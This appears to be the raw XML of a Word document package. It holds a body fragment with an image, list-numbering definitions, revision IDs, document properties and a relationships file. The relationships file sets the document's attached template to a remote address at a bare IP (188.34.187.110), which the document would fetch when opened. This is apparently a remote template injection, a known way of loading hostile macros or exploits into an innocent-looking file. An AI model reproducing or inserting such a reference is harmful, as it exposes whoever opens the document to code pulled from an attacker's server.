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9AB4D" w14:textId="6E4A3391" w:rsidR="00A9204E" w:rsidRPr="000A6683" w:rsidRDefault="006F1347" w:rsidP="000A6683">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49F1B8B7" wp14:editId="70405001">
            <wp:extent cx="9134475" cy="5715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447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204E" w:rsidRPr="000A6683" w:rsidSect="00A808D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653472301038512">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="16534721635912114">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="16534721090127208">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="16534721325553688">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1653472990450706">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1653472572743025">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="16534721984238217">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="16534721947615062">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="16534721020862814">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="16534721111894544">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="16534721952203175">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="16534727634836">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1653472629477323">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="16534722116752871">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1653472461967439">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1653472106582140">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="16534722052344060">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="16534721860045084">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="16534721438477778">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="1653472175853726">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1653472695155945">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="1653472587884897">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="1653472149606689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9EE"/>
    <w:rsid w:val="00051232"/>
    <w:rsid w:val="000A6683"/>
    <w:rsid w:val="001229EE"/>
    <w:rsid w:val="00645252"/>
    <w:rsid w:val="006D3D74"/>
    <w:rsid w:val="006F1347"/>
    <w:rsid w:val="0083569A"/>
    <w:rsid w:val="00A808DA"/>
    <w:rsid w:val="00A9204E"/>
    <w:rsid w:val="00F1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4BDE7"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{1609AE88-1A4C-4378-9527-5E170D67A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<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://188.34.187.110/g0xqtv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{58D48699-8E93-4FC8-9098-7CFB9C1E7727}tf02786999_win32.dotx</Template>
  <TotalTime>19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Accer</cp:lastModifiedBy>
  <cp:revision>6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-05-06T02:33:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-09-22T05:48:00Z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